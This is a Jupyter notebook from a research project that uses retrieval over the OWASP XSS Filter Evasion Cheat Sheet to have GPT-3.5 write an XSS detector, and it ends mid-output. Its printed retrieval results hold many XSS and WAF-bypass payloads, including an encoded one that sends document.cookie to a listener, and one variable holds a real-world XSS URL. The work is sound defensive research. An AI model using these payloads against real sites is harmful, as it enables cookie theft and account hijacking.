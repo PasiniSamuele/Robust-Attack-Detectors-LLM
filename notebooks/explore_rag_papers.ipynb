{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "from langchain.llms.huggingface_pipeline import HuggingFacePipeline\n",
    "from transformers import AutoModelForCausalLM, AutoTokenizer, pipeline\n",
    "from dotenv import dotenv_values\n",
    "import sys\n",
    "sys.path.insert(0,'/workspaces/RAG_secure_code_generation/src')\n",
    "from utils.utils import load_yaml, init_argument_parser, sanitize_output, fill_default_parameters\n",
    "from langchain.prompts import (\n",
    "    ChatPromptTemplate, PromptTemplate\n",
    ")\n",
    "from utils.openai_utils import is_openai_model, build_chat_model\n",
    "from langchain.chat_models import ChatOpenAI\n",
    "from langchain_core.output_parsers import StrOutputParser\n",
    "import random\n",
    "import numpy as np\n",
    "from functools import partial\n",
    "from typing import List\n",
    "from langchain.embeddings import OpenAIEmbeddings\n",
    "\n",
    "\n",
    "from langchain.text_splitter import RecursiveCharacterTextSplitter\n",
    "from langchain.vectorstores import Chroma\n",
    "from langchain.document_loaders.generic import GenericLoader\n",
    "from langchain.document_loaders import WebBaseLoader\n",
    "from utils.custom_grobid_parser import CustomGrobidParser\n",
    "from langchain.docstore.document import Document\n",
    "from langchain_core.embeddings import Embeddings\n",
    "import bs4\n",
    "from langchain_core.runnables import RunnablePassthrough\n",
    "from utils.rag_utils import build_scientific_papers_loader, build_documents_retriever, format_docs, build_web_page_loader\n",
    "from utils.openai_utils import is_openai_model, build_chat_model\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [],
   "source": [
    "def format_docs(docs):\n",
    "    return \"\\n\\n\".join(doc.page_content for doc in docs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [],
   "source": [
    "seed = 156\n",
    "np.random.seed(seed)\n",
    "random.seed(seed)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "template_file = \"../data/templates/complete_function_readable.yaml\"\n",
    "rag_template_file = \"../data/rag_templates/basic_rag_suffix.txt\"\n",
    "task_file = \"../data/tasks/detect_xss_simple_prompt.txt\"\n",
    "parameters_file = \"../data/prompt_parameters/empty.yaml\"\n",
    "papers_folder = \"../data/papers/\"\n",
    "model_name = \"gpt-3.5-turbo-0613\"\n",
    "db_persist_path = \"../data/db/chroma\"\n",
    "db_persist_path_web_test = \"../data/db/chroma_web_test\"\n",
    "db_persist_path_web = \"../data/db/chroma_web\"\n",
    "db_persist_path_blog = \"../data/db/chroma_web_blog\"\n",
    "db_persist_path_book = \"../data/db/chroma_web_book\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "env = dotenv_values()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [],
   "source": [
    "template = load_yaml(template_file)\n",
    "    # load parameters\n",
    "prompt_parameters = load_yaml(parameters_file)\n",
    "\n",
    "#read txt containing the task\n",
    "with open(task_file) as f:\n",
    "    prompt_parameters[\"input\"] = f.read()\n",
    "prompt_parameters = fill_default_parameters(prompt_parameters, template[\"default_parameters\"])\n",
    "with open(rag_template_file) as f:\n",
    "    template['input'] += \"\\n\" + f.read()\n",
    "\n",
    "use_openai_api = is_openai_model(model_name)\n",
    "openai_key = env['OPENAI_API_KEY']\n",
    "model = ChatOpenAI(temperature=0, openai_api_key=openai_key, model=model_name)\n",
    "embeddings = OpenAIEmbeddings(api_key = openai_key)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [],
   "source": [
    "#docs =  build_scientific_papers_loader(papers_folder)\n",
    "#retriever = build_documents_retriever(docs, db_persist_path=db_persist_path_web_test)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html\"\n",
    "docs =  build_web_page_loader(url)\n",
    "\n",
    "retriever = build_documents_retriever(docs, db_persist_path=db_persist_path_web, embeddings=embeddings, chunk_size=5000, chunk_overlap = 500)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(docs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "#url_filter_cheat_sheet = \"https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html\"\n",
    "url_testing = \"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "#docs_online = build_web_page_loader(url_testing)\n",
    "##retriever_web = build_documents_retriever(docs_online, db_persist_path=db_persist_path_web_test)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "prompt = ChatPromptTemplate.from_messages([(\"system\", template['input']), (\"human\", \"{input}\")])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'def detect_xss(http_get_request: str)->bool: \\n\"\"\" Check if in the given http_get_request there is an XSS exploit, considering also the possible evasions that an attacker can perform.\"\"\" '"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "prompt_parameters[\"input\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "prompt_with_examples = '''\n",
    "def detect_xss(http_get_request: str)->bool: \n",
    "\"\"\" Check if in the given http_get_request there is an XSS exploit\"\"\" \n",
    "\n",
    "'''"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "comment = \"what are the escapes that a malicious attack can perform to bypass XSS detection.\"\n",
    "ex = \"unescape(/%78%u0073%73/.source)\"\n",
    "example = \"http://www.concours.agriculture.gouv.fr/calendrier/sommaire.cfm?cal_cdn=%22%3e'%3e%3cscript%20src=ht<br>tp://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e\"\n",
    "rets = retriever.get_relevant_documents(prompt_parameters[\"input\"], k=22)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[Document(page_content='Assuming http://www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\\\\#x09;script: was converted into java    script:, which renders in IE, Netscape 8.1+ in secure site mode and Opera):\\n\\n<A\\xa0HREF=\"http://www.google.com/ogle.com/\">XSS</A>\\nAssisting XSS with HTTP Parameter Pollution¶\\nAssume a content sharing flow on a web site is implemented as shown below. There is a \"Content\" page which includes some content provided by users and this page also includes a link to \"Share\" page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the \"title\" parameter in the \"Content\" page to prevent against XSS but for some reasons they didn\\'t URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type\\'s value is a constant and will always be integer, they didn\\'t encode or validate the content_type in the \"Share\" page.\\nContent Page Source Code¶\\na href=\"/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>\">Share</a>\\nShare Page Source Code¶\\n<script>\\nvar contentType = <%=Request.getParameter(\"content_type\")%>;\\nvar title = \"<%=Encode.forJavaScript(request.getParameter(\"title\"))%>\";\\n...\\n//some user agreement and sending to server logic might be here\\n...\\n</script>\\n\\nContent Page Output¶\\nIn this case if attacker set untrusted content title as “This is a regular title&content_type=1;alert(1)” the link in \"Content\" page would be this:\\n<a href=\"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\">Share</a>\\nShare Page Output¶\\nAnd in share page output could be this:\\n<script>\\nvar contentType = 1; alert(1);\\nvar title = \"This is a regular title\";\\n…\\n//some user agreement and sending to server logic might be here\\n…\\n</script>\\n\\nAs a result, in this example the main flaw is trusting the content_type in the \"Share\" page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.\\nCharacter Escape Sequences¶\\nAll the possible combinations of the character \"\\\\<\" in HTML and JavaScript. Most of these won\\'t render out of the box, but many of them can get rendered in certain circumstances as seen above.\\n\\n<\\n%3C\\n&lt\\n&lt;\\n&LT\\n&LT;\\n&#60;\\n&#060;\\n&#0060;\\n&#00060;\\n&#000060;\\n&#0000060;\\n&#60;\\n&#060;\\n&#0060;\\n&#00060;\\n&#000060;\\n&#0000060;\\n&#x3c;\\n&#x03c;\\n&#x003c;\\n&#x0003c;\\n&#x00003c;\\n&#x000003c;\\n&#x3c;\\n&#x03c;\\n&#x003c;\\n&#x0003c;\\n&#x00003c;\\n&#x000003c;\\n&#X3c;\\n&#X03c;\\n&#X003c;\\n&#X0003c;\\n&#X00003c;\\n&#X000003c;\\n&#X3c;\\n&#X03c;\\n&#X003c;\\n&#X0003c;\\n&#X00003c;\\n&#X000003c;\\n&#x3C;\\n&#x03C;\\n&#x003C;\\n&#x0003C;\\n&#x00003C;\\n&#x000003C;\\n&#x3C;\\n&#x03C;\\n&#x003C;\\n&#x0003C;\\n&#x00003C;\\n&#x000003C;\\n&#X3C;\\n&#X03C;\\n&#X003C;\\n&#X0003C;\\n&#X00003C;\\n&#X000003C;\\n&#X3C;\\n&#X03C;\\n&#X003C;\\n&#X0003C;\\n&#X00003C;\\n&#X000003C;\\n\\\\x3c\\n\\\\x3C\\n\\\\u003c\\n\\\\u003C\\n\\nMethods to Bypass WAF – Cross-Site Scripting¶\\nGeneral issues¶\\nStored XSS¶\\nIf an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.\\nReflected XSS in JavaScript¶\\nExample: <script> ... setTimeout(\\\\\\\\\"writetitle()\\\\\\\\\",$\\\\_GET\\\\[xss\\\\]) ... </script>\\nExploitation:\\xa0/?xss=500);\\xa0alert(document.cookie);//\\n\\nDOM-based XSS¶\\nExample:\\xa0<script> ... eval($\\\\_GET\\\\[xss\\\\]); ... </script>\\nExploitation:\\xa0/?xss=document.cookie\\n\\nXSS via request Redirection¶\\n\\nVulnerable code:\\n\\n...\\nheader(\\'Location:\\xa0\\'.$_GET[\\'param\\']);\\n...\\n\\nAs well as:\\n..\\nheader(\\'Refresh:\\xa00;\\xa0URL=\\'.$_GET[\\'param\\']); \\n...\\n\\n\\nThis request will not pass through the WAF:\\n\\n/?param=<javascript:alert(document.cookie>)\\n\\nThis request will pass through the WAF and an XSS attack will be conducted in certain browsers.\\n\\n/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\\nWAF ByPass Strings for XSS¶', metadata={'description': 'Website with the collection of all the cheat sheets of the project.', 'language': 'en', 'source': 'https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html', 'title': 'XSS Filter Evasion - OWASP Cheat Sheet Series'}),\n",
       " Document(page_content='XSS via request Redirection¶\\n\\nVulnerable code:\\n\\n...\\nheader(\\'Location:\\xa0\\'.$_GET[\\'param\\']);\\n...\\n\\nAs well as:\\n..\\nheader(\\'Refresh:\\xa00;\\xa0URL=\\'.$_GET[\\'param\\']); \\n...\\n\\n\\nThis request will not pass through the WAF:\\n\\n/?param=<javascript:alert(document.cookie>)\\n\\nThis request will pass through the WAF and an XSS attack will be conducted in certain browsers.\\n\\n/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\\nWAF ByPass Strings for XSS¶\\n\\n\\n<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">\\n<Video> <source onerror = \"javascript: alert (XSS)\">\\n<Input value = \"XSS\" type = text>\\n<applet code=\"javascript:confirm(document.cookie);\">\\n<isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">\\n\"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>\\n\"><img src=\"x:x\" onerror=\"alert(XSS)\">\\n\"><iframe src=\"javascript:alert(XSS)\">\\n<object data=\"javascript:alert(XSS)\">\\n<isindex type=image src=1 onerror=alert(XSS)>\\n<img src=x:alert(alt) onerror=eval(src) alt=0>\\n<img  src=\"x:gif\" onerror=\"window[\\'al\\\\u0065rt\\'](0)\"></img>\\n<iframe/src=\"data:text/html,<svg onload=alert(1)>\">\\n<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>\\n<svg><script xlink:href=data&colon;,window.open(\\'https://www.google.com/\\')></script\\n<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">\\n<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>\\n<form><a href=\"javascript:\\\\u0061lert(1)\">X\\n</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror=\\'eval(src)\\'>\\n<style>//*{x:expression(alert(/xss/))}//<style></style>\\nOn Mouse Over\\u200b\\n<img src=\"/\" =_=\" title=\"onerror=\\'prompt(1)\\'\">\\n<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe\\n<script x> alert(1) </script 1=2\\n<form><button formaction=javascript&colon;alert(1)>CLICKME\\n<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"\\n<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>\\n<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>\\n\\n\\nFilter Bypass Alert Obfuscation¶\\n\\n(alert)(1)\\na=alert,a(1)\\n[1].find(alert)\\ntop[“al”+”ert”](1)\\ntop[/al/.source+/ert/.source](1)\\nal\\\\u0065rt(1)\\ntop[‘al\\\\145rt’](1)\\ntop[‘al\\\\x65rt’](1)\\ntop[8680439..toString(30)](1)\\nalert?.()\\n`${alert``}` (The payload should include leading and trailing backticks.)\\n(alert())\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n      ©Copyright  - Cheat Sheets Series Team - This work is licensed under Creative Commons Attribution-ShareAlike 4.0 International.\\n    \\n  \\n  \\n    Made with\\n    \\n      Material for MkDocs', metadata={'description': 'Website with the collection of all the cheat sheets of the project.', 'language': 'en', 'source': 'https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html', 'title': 'XSS Filter Evasion - OWASP Cheat Sheet Series'}),\n",
       " Document(page_content='<SCRIPT\\xa0a=>SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\\n\\nHere\\'s an XSS example that bets on the fact that the regex won\\'t catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:\\n<SCRIPT\\xa0a=\">\\'>\"\\xa0SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\\nThis XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:\\n<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT\\xa0SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>\\nURL String Evasion¶\\nAssuming http://www.google.com/ is programmatically disallowed:\\nIP Versus Hostname¶\\n<A\\xa0HREF=\"http://66.102.7.147/\">XSS</A>\\nURL Encoding¶\\n<A\\xa0HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>\\nDWORD Encoding¶\\nNote: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:\\n<A\\xa0HREF=\"http://1113982867/\">XSS</A>\\nHex Encoding¶\\nThe total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):\\n<A\\xa0HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>\\nOctal Encoding¶\\nAgain padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...:\\n<A\\xa0HREF=\"http://0102.0146.0007.00000223/\">XSS</A>\\nBase64 Encoding¶\\n<img\\xa0onload=\"eval(atob(\\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU=\\'))\">\\nMixed Encoding¶\\nLet\\'s mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I\\'ll never know). The tabs and newlines only work if this is encapsulated with quotes:\\n\\n<A\\xa0HREF=\"h \\ntt\\xa0\\xa0p://6   6.000146.0x7.147/\">XSS</A>\\n\\n\\nProtocol Resolution Bypass¶\\n// translates to http:// which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\\\\\\\\\\\\\. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.\\n<A\\xa0HREF=\"//www.google.com/\">XSS</A>\\nGoogle \"feeling lucky\" part 1¶\\nFirefox uses Google\\'s \"feeling lucky\" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox\\'s keyword: protocol. You can concatenate several keywords by using something like the following keyword:XSS+RSnake for instance. This no longer works within Firefox as of 2.0.\\n<A\\xa0HREF=\"//google\">XSS</A>\\nGoogle \"feeling lucky\" part 2¶\\nThis uses a very tiny trick that appears to work Firefox only, because of it\\'s implementation of the \"feeling lucky\" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It\\'s simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:\\n<A\\xa0HREF=\"http://ha.ckers.org@google\">XSS</A>\\nGoogle \"feeling lucky\" part 3¶\\nThis uses a malformed URL that appears to work in Firefox and Opera only, because of their implementation of the \"feeling lucky\" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case \"google\"):\\n<A\\xa0HREF=\"http://google:ha.ckers.org\">XSS</A>\\nRemoving CNAMEs¶\\nWhen combined with the above URL, removing www. will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):\\n<A\\xa0HREF=\"http://google.com/\">XSS</A>\\nExtra dot for absolute DNS:\\n<A\\xa0HREF=\"http://www.google.com./\">XSS</A>\\nJavaScript Link Location¶\\n<A\\xa0HREF=\"javascript:document.location=\\'http://www.google.com/\\'\">XSS</A>\\nContent Replace as Attack Vector¶\\n\\nAssuming http://www.google.com/ is programmatically replaced with nothing). I actually used a similar attack vector against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: java&\\\\#x09;script: was converted into java    script:, which renders in IE, Netscape 8.1+ in secure site mode and Opera):', metadata={'description': 'Website with the collection of all the cheat sheets of the project.', 'language': 'en', 'source': 'https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html', 'title': 'XSS Filter Evasion - OWASP Cheat Sheet Series'}),\n",
       " Document(page_content='XSS Filter Evasion - OWASP Cheat Sheet Series\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n          Skip to content\\n        \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n            OWASP Cheat Sheet Series\\n          \\n\\n\\n\\n            \\n              XSS Filter Evasion\\n            \\n          \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n            Initializing search\\n          \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n    OWASP/CheatSheetSeries\\n  \\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n    OWASP Cheat Sheet Series\\n  \\n\\n\\n\\n\\n\\n\\n    OWASP/CheatSheetSeries\\n  \\n\\n\\n\\n\\n\\n\\n    Introduction\\n  \\n\\n\\n\\n\\n\\n    Index Alphabetical\\n  \\n\\n\\n\\n\\n\\n    Index ASVS\\n  \\n\\n\\n\\n\\n\\n    Index MASVS\\n  \\n\\n\\n\\n\\n\\n    Index Proactive Controls\\n  \\n\\n\\n\\n\\n\\n    Index Top 10\\n  \\n\\n\\n\\n\\n\\n\\n    Cheatsheets\\n  \\n\\n\\n\\n\\n\\n            Cheatsheets\\n          \\n\\n\\n\\n\\n    AJAX Security\\n  \\n\\n\\n\\n\\n\\n    Abuse Case\\n  \\n\\n\\n\\n\\n\\n    Access Control\\n  \\n\\n\\n\\n\\n\\n    Attack Surface Analysis\\n  \\n\\n\\n\\n\\n\\n    Authentication\\n  \\n\\n\\n\\n\\n\\n    Authorization\\n  \\n\\n\\n\\n\\n\\n    Authorization Testing Automation\\n  \\n\\n\\n\\n\\n\\n    Bean Validation\\n  \\n\\n\\n\\n\\n\\n    C-Based Toolchain Hardening\\n  \\n\\n\\n\\n\\n\\n    CI CD Security\\n  \\n\\n\\n\\n\\n\\n    Choosing and Using Security Questions\\n  \\n\\n\\n\\n\\n\\n    Clickjacking Defense\\n  \\n\\n\\n\\n\\n\\n    Content Security Policy\\n  \\n\\n\\n\\n\\n\\n    Credential Stuffing Prevention\\n  \\n\\n\\n\\n\\n\\n    Cross-Site Request Forgery Prevention\\n  \\n\\n\\n\\n\\n\\n    Cross Site Scripting Prevention\\n  \\n\\n\\n\\n\\n\\n    Cryptographic Storage\\n  \\n\\n\\n\\n\\n\\n    DOM Clobbering Prevention\\n  \\n\\n\\n\\n\\n\\n    DOM based XSS Prevention\\n  \\n\\n\\n\\n\\n\\n    Database Security\\n  \\n\\n\\n\\n\\n\\n    Denial of Service\\n  \\n\\n\\n\\n\\n\\n    Deserialization\\n  \\n\\n\\n\\n\\n\\n    Django REST Framework\\n  \\n\\n\\n\\n\\n\\n    Django Security\\n  \\n\\n\\n\\n\\n\\n    Docker Security\\n  \\n\\n\\n\\n\\n\\n    DotNet Security\\n  \\n\\n\\n\\n\\n\\n    Error Handling\\n  \\n\\n\\n\\n\\n\\n    File Upload\\n  \\n\\n\\n\\n\\n\\n    Forgot Password\\n  \\n\\n\\n\\n\\n\\n    GraphQL\\n  \\n\\n\\n\\n\\n\\n    HTML5 Security\\n  \\n\\n\\n\\n\\n\\n    HTTP Headers\\n  \\n\\n\\n\\n\\n\\n    HTTP Strict Transport Security\\n  \\n\\n\\n\\n\\n\\n    Infrastructure as Code Security\\n  \\n\\n\\n\\n\\n\\n    Injection Prevention\\n  \\n\\n\\n\\n\\n\\n    Injection Prevention in Java\\n  \\n\\n\\n\\n\\n\\n    Input Validation\\n  \\n\\n\\n\\n\\n\\n    Insecure Direct Object Reference Prevention\\n  \\n\\n\\n\\n\\n\\n    JAAS\\n  \\n\\n\\n\\n\\n\\n    JSON Web Token for Java\\n  \\n\\n\\n\\n\\n\\n    Java Security\\n  \\n\\n\\n\\n\\n\\n    Key Management\\n  \\n\\n\\n\\n\\n\\n    Kubernetes Security\\n  \\n\\n\\n\\n\\n\\n    LDAP Injection Prevention\\n  \\n\\n\\n\\n\\n\\n    Laravel\\n  \\n\\n\\n\\n\\n\\n    Logging\\n  \\n\\n\\n\\n\\n\\n    Logging Vocabulary\\n  \\n\\n\\n\\n\\n\\n    Mass Assignment\\n  \\n\\n\\n\\n\\n\\n    Microservices Security\\n  \\n\\n\\n\\n\\n\\n    Microservices based Security Arch Doc\\n  \\n\\n\\n\\n\\n\\n    Mobile Application Security\\n  \\n\\n\\n\\n\\n\\n    Multifactor Authentication\\n  \\n\\n\\n\\n\\n\\n    NPM Security\\n  \\n\\n\\n\\n\\n\\n    Network Segmentation\\n  \\n\\n\\n\\n\\n\\n    NodeJS Docker\\n  \\n\\n\\n\\n\\n\\n    Nodejs Security\\n  \\n\\n\\n\\n\\n\\n    OAuth2\\n  \\n\\n\\n\\n\\n\\n    OS Command Injection Defense\\n  \\n\\n\\n\\n\\n\\n    PHP Configuration\\n  \\n\\n\\n\\n\\n\\n    Password Storage\\n  \\n\\n\\n\\n\\n\\n    Pinning\\n  \\n\\n\\n\\n\\n\\n    Prototype Pollution Prevention\\n  \\n\\n\\n\\n\\n\\n    Query Parameterization\\n  \\n\\n\\n\\n\\n\\n    REST Assessment\\n  \\n\\n\\n\\n\\n\\n    REST Security\\n  \\n\\n\\n\\n\\n\\n    Ruby on Rails\\n  \\n\\n\\n\\n\\n\\n    SAML Security\\n  \\n\\n\\n\\n\\n\\n    SQL Injection Prevention\\n  \\n\\n\\n\\n\\n\\n    Secrets Management\\n  \\n\\n\\n\\n\\n\\n    Secure Cloud Architecture\\n  \\n\\n\\n\\n\\n\\n    Secure Product Design\\n  \\n\\n\\n\\n\\n\\n    Securing Cascading Style Sheets\\n  \\n\\n\\n\\n\\n\\n    Server Side Request Forgery Prevention\\n  \\n\\n\\n\\n\\n\\n    Session Management\\n  \\n\\n\\n\\n\\n\\n    Symfony\\n  \\n\\n\\n\\n\\n\\n    TLS Cipher String\\n  \\n\\n\\n\\n\\n\\n    Third Party Javascript Management\\n  \\n\\n\\n\\n\\n\\n    Threat Modeling\\n  \\n\\n\\n\\n\\n\\n    Transaction Authorization\\n  \\n\\n\\n\\n\\n\\n    Transport Layer Protection\\n  \\n\\n\\n\\n\\n\\n    Transport Layer Security\\n  \\n\\n\\n\\n\\n\\n    Unvalidated Redirects and Forwards\\n  \\n\\n\\n\\n\\n\\n    User Privacy Protection\\n  \\n\\n\\n\\n\\n\\n    Virtual Patching\\n  \\n\\n\\n\\n\\n\\n    Vulnerability Disclosure\\n  \\n\\n\\n\\n\\n\\n    Vulnerable Dependency Management\\n  \\n\\n\\n\\n\\n\\n    Web Service Security\\n  \\n\\n\\n\\n\\n\\n    XML External Entity Prevention\\n  \\n\\n\\n\\n\\n\\n    XML Security\\n  \\n\\n\\n\\n\\n\\n\\n    XSS Filter Evasion\\n  \\n\\n\\n\\n\\n    XSS Filter Evasion\\n  \\n\\n\\n\\n\\n      Table of contents\\n    \\n\\n\\n\\n    Introduction\\n  \\n\\n\\n\\n    Tests\\n  \\n\\n\\n\\n\\n    Basic XSS Test Without Filter Evasion\\n  \\n\\n\\n\\n    XSS Locator (Polyglot)\\n  \\n\\n\\n\\n    Malformed A Tags\\n  \\n\\n\\n\\n    Malformed IMG Tags\\n  \\n\\n\\n\\n    fromCharCode\\n  \\n\\n\\n\\n    Default SRC Tag to Get Past Filters that Check SRC Domain\\n  \\n\\n\\n\\n    Default SRC Tag by Leaving it Empty\\n  \\n\\n\\n\\n    Default SRC Tag by Leaving it out Entirely\\n  \\n\\n\\n\\n    On Error Alert\\n  \\n\\n\\n\\n    IMG onerror and JavaScript Alert Encode\\n  \\n\\n\\n\\n    Decimal HTML Character References\\n  \\n\\n\\n\\n    Decimal HTML Character References Without Trailing Semicolons\\n  \\n\\n\\n\\n    Hexadecimal HTML Character References Without Trailing Semicolons\\n  \\n\\n\\n\\n    Embedded Tab\\n  \\n\\n\\n\\n    Embedded Encoded Tab\\n  \\n\\n\\n\\n    Embedded Newline to Break-up XSS\\n  \\n\\n\\n\\n    Embedded Carriage Return to Break-up XSS\\n  \\n\\n\\n\\n    Null breaks up JavaScript Directive\\n  \\n\\n\\n\\n    Spaces and Meta Chars Before the JavaScript in Images for XSS\\n  \\n\\n\\n\\n    Non-alpha-non-digit XSS\\n  \\n\\n\\n\\n    Extraneous Open Brackets\\n  \\n\\n\\n\\n    No Closing Script Tags\\n  \\n\\n\\n\\n    Protocol Resolution in Script Tags\\n  \\n\\n\\n\\n    Half Open HTML/JavaScript XSS Vector\\n  \\n\\n\\n\\n    Double Open Angle Brackets\\n  \\n\\n\\n\\n    Escaping JavaScript Escapes\\n  \\n\\n\\n\\n    End Title Tag\\n  \\n\\n\\n\\n    INPUT Image\\n  \\n\\n\\n\\n    BODY Image\\n  \\n\\n\\n\\n    IMG Dynsrc\\n  \\n\\n\\n\\n    IMG Lowsrc', metadata={'description': 'Website with the collection of all the cheat sheets of the project.', 'language': 'en', 'source': 'https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html', 'title': 'XSS Filter Evasion - OWASP Cheat Sheet Series'})]"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "rets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "chain =  prompt | model | StrOutputParser() | sanitize_output\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [],
   "source": [
    "prompt_parameters[\"context\"] = retriever | format_docs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
